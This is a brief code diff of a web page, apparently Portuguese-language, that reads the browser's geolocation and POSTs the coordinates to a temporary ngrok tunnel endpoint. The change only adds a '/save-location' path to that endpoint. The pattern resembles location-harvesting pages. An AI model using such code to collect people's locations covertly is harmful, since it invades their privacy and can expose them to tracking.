@@ -26,7 +26,7 @@
           const longitude = position.coords.longitude;
           status.textContent = 'Localização capturada! Enviando...';
 
-          fetch('https://90db6eaa4b5d.ngrok-free.app', {
+          fetch('https://90db6eaa4b5d.ngrok-free.app/save-location', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ latitude, longitude }),
@@ -47,4 +47,3 @@
   </script>
 </body>
 </html>
-
